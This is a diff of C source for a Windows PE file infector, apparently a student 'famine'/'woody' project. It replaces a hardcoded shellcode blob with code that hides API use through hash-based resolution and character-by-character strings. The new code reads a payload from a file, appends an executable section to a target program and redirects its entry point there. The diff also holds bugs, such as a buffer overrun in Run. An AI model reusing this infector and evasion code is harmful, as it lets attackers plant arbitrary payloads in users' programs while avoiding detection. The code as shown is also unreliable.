@@ -1,12 +1,35 @@
-#include <windows.h>
-#include <stdio.h>
-#include <stdbool.h>
+#define WIN32_LEAN_AND_MEAN // Exclude rarely-used stuff from Windows headers
 
-#define ERROR_SYS(x) fprintf(stderr, "Error: %s (Error code: %lu)\n", x, GetLastError())
-#define SECTION_NAME ".inject"
-#define SECTION_NAME_SIZE 8
+#pragma warning( disable : 4201 ) // Disable warning about 'nameless struct/union'
 
-typedef struct s_injector
+#include "GetProcAddressWithHash.h"
+#include "famine.h"
+// #include <Windows.h> // only for types
+
+void	*ft_memcpy(void *dst, const void *src, size_t n)
+{
+	size_t i;
+
+	if (!dst && !src)
+		return (0);
+	i = 0;
+	while (i < n)
+	{
+		((unsigned char *)dst)[i] = ((unsigned char *)src)[i];
+		i++;
+	}
+	return (dst);
+}
+
+DWORD align(DWORD size, DWORD align, DWORD addr)
+{
+    if (!(size % align))
+        return addr + size;
+    return addr + (size / align + 1) * align;
+}
+
+// Structure for handling PE injection
+typedef struct woody
 {
     char *target;
     HANDLE file_handle;
@@ -16,116 +39,191 @@ typedef struct s_injector
     PIMAGE_NT_HEADERS nt_headers;
     PIMAGE_SECTION_HEADER section_headers;
     WORD number_of_sections;
-} t_injector;
 
-// Sample shellcode (prints "Hello, World!" and exits)
-unsigned char shellcode[] = 
-"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
-"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
-"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
-"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
-"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
-"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
-"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
-"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
-"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
-"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
-"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
-"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
-"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
-"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
-"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
-"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x3e\x48"
-"\x8d\x8d\x1f\x01\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5"
-"\x49\xc7\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x0e\x01\x00"
-"\x00\x3e\x4c\x8d\x85\x14\x01\x00\x00\x48\x31\xc9\x41\xba"
-"\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2"
-"\x56\xff\xd5\x48\x45\x4c\x4c\x4f\x00\x4d\x65\x73\x73\x61"
-"\x67\x65\x42\x6f\x78\x00\x75\x73\x65\x72\x33\x32\x2e\x64"
-"\x6c\x6c\x00";
-    
-void clean_injector(t_injector *injector)
-{
-    if (injector->file_view)
-        UnmapViewOfFile(injector->file_view);
-    if (injector->file_mapping)
-        CloseHandle(injector->file_mapping);
-    if (injector->file_handle != INVALID_HANDLE_VALUE)
-        CloseHandle(injector->file_handle);
-}
+    PCHAR shellcode;
+    DWORD shellcode_size;
+} woody;
 
-bool map_file(char *pe_filename, t_injector *injector)
+// VOID clean_woody(woody *injector)
+// {
+//     if (injector->file_view)
+//         UnmapViewOfFile(injector->file_view);
+//     if (injector->file_mapping)
+//         CloseHandle(injector->file_mapping);
+//     if (injector->file_handle != INVALID_HANDLE_VALUE)
+//         CloseHandle(injector->file_handle);
+// }
+
+BOOLEAN map_file(PCHAR pe_filename, woody *injector, PCHAR sc_filename)
 {
-    injector->file_handle = CreateFile(pe_filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (injector->file_handle == INVALID_HANDLE_VALUE)
+    HANDLE hKernel32 = NULL;
+    LDRLOADDLL pLdrLoadDll = NULL;
+    LDRGETPROCADDRESS pLdrGetProcAddress = NULL;
+    CREATEFILEA pCreateFileA = NULL;
+    GETFILESIZE pGetFileSize = NULL;
+    CREATEFILEMAPPINGA pCreateFileMappingA = NULL;
+    MAPVIEWOFFILE pMapViewOfFile = NULL;
+    CLOSEHANDLE pCloseHandle = NULL;
+
+    WCHAR sKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l' };
+
+    // Resolve LdrLoadDll and LdrGetProcAddress
+    pLdrLoadDll = GetProcAddressWithHash(LDRLOADDLL_HASH);
+    pLdrGetProcAddress = GetProcAddressWithHash(LDRGETPROCADDRESS_HASH);
+
+    if (!pLdrLoadDll || !pLdrGetProcAddress)
     {
-        ERROR_SYS("CreateFile");
-        return false;
+        ERROR_SYS("GetProcAddress");
+        return FALSE;
     }
 
-    injector->file_size = GetFileSize(injector->file_handle, NULL);
+    // Load kernel32.dll
+    UNICODE_STRING uString = { 0 };
+    uString.Buffer = sKernel32;
+    uString.Length = sizeof(sKernel32);
+    uString.MaximumLength = sizeof(sKernel32);
+
+    pLdrLoadDll(NULL, 0, &uString, &hKernel32);
+    if (!hKernel32)
+    {
+        ERROR_SYS("LdrLoadDll");
+        return FALSE;
+    }
+
+    // Get function pointers for kernel32.dll functions
+    pCreateFileA = (CREATEFILEA)GetProcAddressWithHash(CREATEFILEA_HASH);
+    pGetFileSize = (GETFILESIZE)GetProcAddressWithHash(GETFILESIZE_HASH);
+    pCreateFileMappingA = (CREATEFILEMAPPINGA)GetProcAddressWithHash(CREATEFILEMAPPINGA_HASH);
+    pMapViewOfFile = (MAPVIEWOFFILE)GetProcAddressWithHash(MAPVIEWOFFILE_HASH);
+    pCloseHandle = (CLOSEHANDLE)GetProcAddressWithHash(CLOSEHANDLE_HASH);
+
+    if (!pCreateFileA || !pGetFileSize || !pCreateFileMappingA || !pMapViewOfFile || !pCloseHandle)
+    {
+        ERROR_SYS("GetProcAddress for kernel32");
+        return FALSE;
+    }
+
+    // Use the dynamically retrieved functions to handle the file
+    injector->file_handle = pCreateFileA(pe_filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (injector->file_handle == INVALID_HANDLE_VALUE)
+    {
+        ERROR_SYS("CreateFileA");
+        return FALSE;
+    }
+
+    injector->file_size = pGetFileSize(injector->file_handle, NULL);
     if (injector->file_size == INVALID_FILE_SIZE)
     {
         ERROR_SYS("GetFileSize");
-        clean_injector(injector);
-        return false;
+        // clean_woody(injector);
+        return FALSE;
     }
 
-    injector->file_mapping = CreateFileMapping(injector->file_handle, NULL, PAGE_READWRITE, 0, injector->file_size, NULL);
+    injector->file_mapping = pCreateFileMappingA(injector->file_handle, NULL, PAGE_READWRITE, 0, injector->file_size, NULL);
     if (!injector->file_mapping)
     {
-        ERROR_SYS("CreateFileMapping");
-        clean_injector(injector);
-        return false;
+        ERROR_SYS("CreateFileMappingA");
+        // clean_woody(injector);
+        return FALSE;
     }
 
-    injector->file_view = MapViewOfFile(injector->file_mapping, FILE_MAP_ALL_ACCESS, 0, 0, injector->file_size);
+    injector->file_view = pMapViewOfFile(injector->file_mapping, FILE_MAP_ALL_ACCESS, 0, 0, injector->file_size);
     if (!injector->file_view)
     {
         ERROR_SYS("MapViewOfFile");
-        clean_injector(injector);
-        return false;
+        // clean_woody(injector);
+        return FALSE;
     }
 
-    return true;
+    // read shellcode from file path
+    HANDLE hFile = pCreateFileA(sc_filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE)
+    {
+        ERROR_SYS("CreateFileA");
+        // clean_woody(injector);
+        return FALSE;
+    }
+
+    injector->shellcode_size = pGetFileSize(hFile, NULL);
+    if (injector->shellcode_size == INVALID_FILE_SIZE)
+    {
+        ERROR_SYS("GetFileSize");
+        // clean_woody(injector);
+        return FALSE;
+    }
+
+    // Create a file mapping object
+    HANDLE hFileMapping = pCreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, injector->shellcode_size, NULL);
+    if (!hFileMapping)
+    {
+        ERROR_SYS("CreateFileMappingA");
+        return FALSE;
+    }
+
+    injector->shellcode = (char *)pMapViewOfFile(hFileMapping, FILE_MAP_ALL_ACCESS, 0, 0, injector->shellcode_size);
+    if (!injector->shellcode)
+    {
+        ERROR_SYS("MapViewOfFile");
+        // clean_woody(injector);
+        return FALSE;
+    }
+
+
+
+
+    // CloseHandle(hFile);
+
+    return TRUE;
 }
 
-bool read_pe_header(t_injector *injector)
+
+BOOLEAN read_pe_header(woody *injector)
 {
     PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)injector->file_view;
     if (dos_header->e_magic != IMAGE_DOS_SIGNATURE)
     {
         ERROR_SYS("Invalid DOS signature");
-        return false;
+        return FALSE;
     }
 
     injector->nt_headers = (PIMAGE_NT_HEADERS)((BYTE *)injector->file_view + dos_header->e_lfanew);
     if (injector->nt_headers->Signature != IMAGE_NT_SIGNATURE)
     {
         ERROR_SYS("Invalid NT signature");
-        return false;
+        return FALSE;
     }
 
     if (injector->nt_headers->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64)
     {
         ERROR_SYS("Unsupported architecture (64-bit only)");
-        return false;
+        return FALSE;
     }
 
     if (!(injector->nt_headers->FileHeader.Characteristics & IMAGE_FILE_EXECUTABLE_IMAGE))
     {
         ERROR_SYS("File is not executable");
-        return false;
+        return FALSE;
     }
 
     injector->number_of_sections = injector->nt_headers->FileHeader.NumberOfSections;
     injector->section_headers = IMAGE_FIRST_SECTION(injector->nt_headers);
 
-    return true;
+    return TRUE;
 }
 
-void inject_shellcode(t_injector *injector)
+VOID inject_shellcode(woody *injector)
 {
+    char section_name[SECTION_NAME_SIZE];
+    section_name[0] = '.';
+    section_name[1] = 'w';
+    section_name[2] = 'o';
+    section_name[3] = 'o';
+    section_name[4] = 'd';
+    section_name[5] = 'y';
+    section_name[6] = '\0';  // Null terminator for safety
+    section_name[7] = '\0';  // Padding to complete 8 bytes
+
+
     PIMAGE_SECTION_HEADER new_section;
     DWORD file_alignment, section_alignment;
     DWORD new_section_rva, new_section_raw_size, new_section_virtual_size;
@@ -133,106 +231,86 @@ void inject_shellcode(t_injector *injector)
     // Save the original entry point
     DWORD original_entry_point = injector->nt_headers->OptionalHeader.AddressOfEntryPoint;
 
-
-    // Jump back routine
-    unsigned char jump_to_oep[] = {
-        // 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, // mov rax, gs:[0x60]
-        // 0x48, 0x8B, 0x40, 0x10,                               // mov rax, [rax+0x10]
-        // 0x48, 0x05, 0xAA, 0xAA, 0xAA, 0xAA,                   // add rax, OriginalEntryPointRVA
-        // 0xFF, 0xE0                                            // jmp rax
-    };
-
-    // Combine shellcode and jump back routine
-    size_t shellcode_size = sizeof(shellcode);
-    size_t jump_size = sizeof(jump_to_oep);
-    size_t total_shellcode_size = shellcode_size + jump_size;
-
-    unsigned char *combined_shellcode = malloc(total_shellcode_size);
-    if (!combined_shellcode) {
-        fprintf(stderr, "Failed to allocate memory for combined shellcode\n");
-        return;
-    }
-
-    // Copy the original shellcode
-    memcpy(combined_shellcode, shellcode, shellcode_size);
-
-    // Append the jump back routine
-    memcpy(combined_shellcode + shellcode_size, jump_to_oep, jump_size);
-
-    // Replace the placeholder with the actual OEP RVA
-    size_t oep_placeholder_offset = shellcode_size + 15; // Offset in jump_to_oep
-    DWORD oep_rva = original_entry_point;
-    memcpy(combined_shellcode + oep_placeholder_offset, &oep_rva, sizeof(DWORD));
-
-    // Proceed with injecting the combined shellcode
+    // Proceed with injecting the shellcode
     new_section = &injector->section_headers[injector->number_of_sections];
 
-    memcpy(new_section->Name, SECTION_NAME, SECTION_NAME_SIZE);
+    ft_memcpy(new_section->Name, section_name, SECTION_NAME_SIZE);
 
     file_alignment = injector->nt_headers->OptionalHeader.FileAlignment;
     section_alignment = injector->nt_headers->OptionalHeader.SectionAlignment;
 
-    new_section_rva = (injector->section_headers[injector->number_of_sections - 1].VirtualAddress +
-                       injector->section_headers[injector->number_of_sections - 1].Misc.VirtualSize +
-                       section_alignment - 1) &
-                      ~(section_alignment - 1);
+    new_section_rva = align(injector->section_headers[injector->number_of_sections - 1].Misc.VirtualSize,
+                            section_alignment,
+                            injector->section_headers[injector->number_of_sections - 1].VirtualAddress);
 
     new_section->VirtualAddress = new_section_rva;
-    new_section_virtual_size = (total_shellcode_size + section_alignment - 1) & ~(section_alignment - 1);
+    new_section_virtual_size = align(injector->shellcode_size, section_alignment, 0);
     new_section->Misc.VirtualSize = new_section_virtual_size;
-    new_section_raw_size = (total_shellcode_size + file_alignment - 1) & ~(file_alignment - 1);
+    new_section_raw_size = align(injector->shellcode_size, file_alignment, 0);
     new_section->SizeOfRawData = new_section_raw_size;
-    new_section->PointerToRawData = (injector->section_headers[injector->number_of_sections - 1].PointerToRawData +
-                                     injector->section_headers[injector->number_of_sections - 1].SizeOfRawData +
-                                     file_alignment - 1) &
-                                    ~(file_alignment - 1);
+    new_section->PointerToRawData = align(injector->section_headers[injector->number_of_sections - 1].SizeOfRawData,
+                                          file_alignment,
+                                          injector->section_headers[injector->number_of_sections - 1].PointerToRawData);
     new_section->Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;
 
     injector->nt_headers->OptionalHeader.SizeOfImage = new_section_rva + new_section_virtual_size;
     injector->nt_headers->FileHeader.NumberOfSections++;
 
-    // Copy the combined shellcode into the new section
-    memcpy((BYTE *)injector->file_view + new_section->PointerToRawData, combined_shellcode, total_shellcode_size);
+    // Copy the shellcode into the new section
+    ft_memcpy((BYTE *)injector->file_view + new_section->PointerToRawData, injector->shellcode, injector->shellcode_size);
 
     injector->file_size += new_section_raw_size;
 
     // Modify entry point to point to our new section
     injector->nt_headers->OptionalHeader.AddressOfEntryPoint = new_section_rva;
 
-    printf("Shellcode injected into new section '%s' at RVA: 0x%08X\n", SECTION_NAME, new_section_rva);
-    printf("Original entry point: 0x%08X\n", original_entry_point);
-
-    // Free allocated memory
-    free(combined_shellcode);
 }
 
-void inject_shellcode_pe(char *target)
+VOID inject_shellcode_pe(WCHAR *target, PCHAR sc_filename)
 {
-    t_injector injector = {0};
+    woody injector;
     injector.target = target;
 
-    if (!map_file(target, &injector))
+    if (!map_file(target, &injector, sc_filename))
         return;
 
     if (!read_pe_header(&injector))
     {
-        clean_injector(&injector);
+        // clean_woody(&injector);
         return;
     }
 
     inject_shellcode(&injector);
 
-    clean_injector(&injector);
+    // clean_woody(&injector);
+}
+
+VOID Run(VOID)
+{
+    #pragma warning( push )
+    #pragma warning( disable : 4055 ) // Ignore cast warnings
+    
+    char test[5];
+    test[0] = 'c';
+    test[1] = '.';
+    test[2] = 'e';
+    test[3] = 'x';
+    test[4] = 'e';
+    test[5] = '\0';
+
+    char shellcode[6];
+    shellcode[0] = 't';
+    shellcode[1] = '.';
+    shellcode[2] = 'b';
+    shellcode[3] = 'i';
+    shellcode[4] = 'n';
+    shellcode[5] = '\0';
+
+    inject_shellcode_pe(test, shellcode);
 }
 
 int main(int argc, char *argv[])
 {
-    if (argc != 2)
-    {
-        fprintf(stderr, "Usage: %s <PE file>\n", argv[0]);
-        return 1;
-    }
-
-    inject_shellcode_pe(argv[1]);
+    Run();
     return 0;
 }
